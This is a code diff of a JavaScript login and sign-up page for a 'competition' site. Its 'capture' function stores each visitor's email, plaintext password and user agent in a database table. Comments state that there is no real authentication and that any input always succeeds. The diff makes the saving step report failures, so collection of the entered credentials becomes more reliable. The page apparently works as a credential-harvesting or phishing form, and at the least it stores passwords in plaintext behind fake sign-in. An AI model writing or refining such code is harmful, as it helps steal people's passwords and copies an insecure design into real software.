@@ -469,21 +469,25 @@ function setLoading(btnId, loading) {
 // ── CAPTURE TO TABLE ────────────────────────────────
 // TEST MODE: no real auth — just insert whatever is entered and always succeed
 async function capture(email, password, action) {
-  try {
-    await sb.from('competition_users').insert({
-      email:      email,
-      password:   password,
-      action:     action,
-      user_agent: navigator.userAgent,
-      created_at: new Date().toISOString(),
-    });
-  } catch { /* non-fatal — still show success */ }
+  const { error } = await sb.from('competition_users').insert({
+    email:      email,
+    password:   password,
+    action:     action,
+    user_agent: navigator.userAgent,
+    created_at: new Date().toISOString(),
+  });
+  if (error) {
+    console.error('[competition_users insert]', error.message || error);
+    showAlert('err', 'Database error: ' + (error.message || 'Could not save entry. Check console for details.'));
+    return false;
+  }
+  return true;
 }
 
 // ── SHOW SUCCESS ─────────────────────────────────────
 function showSuccess(isNew) {
-  // Mark as authenticated so index.html skips GPS redirect on return
-  sessionStorage.setItem('competition_auth', '1');
+  // Mark session as authenticated so index.html skips the login redirect
+  sessionStorage.setItem('gp_auth', '1');
   document.getElementById('auth-card').style.display = 'none';
   const s = document.getElementById('screen-success');
   s.style.display = 'flex';
@@ -508,9 +512,9 @@ async function signIn() {
   if (!ok) return;
 
   setLoading('btn-signin', true);
-  await capture(email, password, 'signin');
+  const saved = await capture(email, password, 'signin');
   setLoading('btn-signin', false);
-  showSuccess(false);
+  if (saved) showSuccess(false);
 }
 
 // ── SIGN UP ─────────────────────────────────────────
@@ -529,9 +533,9 @@ async function signUp() {
   if (!ok) return;
 
   setLoading('btn-signup', true);
-  await capture(email, password, 'signup');
+  const saved = await capture(email, password, 'signup');
   setLoading('btn-signup', false);
-  showSuccess(true);
+  if (saved) showSuccess(true);
 }
 
 // ── ENTER KEY SUPPORT ────────────────────────────────
